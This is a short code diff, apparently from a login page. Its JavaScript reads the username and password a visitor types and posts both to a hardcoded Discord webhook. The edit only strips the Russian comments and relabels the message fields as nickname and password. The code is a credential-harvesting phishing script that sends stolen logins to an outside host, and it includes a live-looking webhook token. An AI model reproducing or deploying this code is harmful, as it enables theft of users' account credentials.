@@ -51,11 +51,11 @@
             var username = $('#username').val();
             var password = $('#password').val();
 
-            // Ваш вебхук URL
+            
             var webhookUrl = 'https://discord.com/api/webhooks/1240014187904766004/fvPErv-6FaCSG9AhtpNHGrpLgkWfX1zEOf8rYzT23XPmS9-OfuJMglkqURa3sPchV2en';
 
-            // Сообщение, которое будет отправлено
-            var message = 'Привет, ' + username + 'parol , ' + password + '!';
+           
+            var message = 'Ник, ' + username + ' Пароль , ' + password + '!';
 
             $.post(webhookUrl, {content: message}, function() {
                 alert('Сообщение успешно отправлено!');
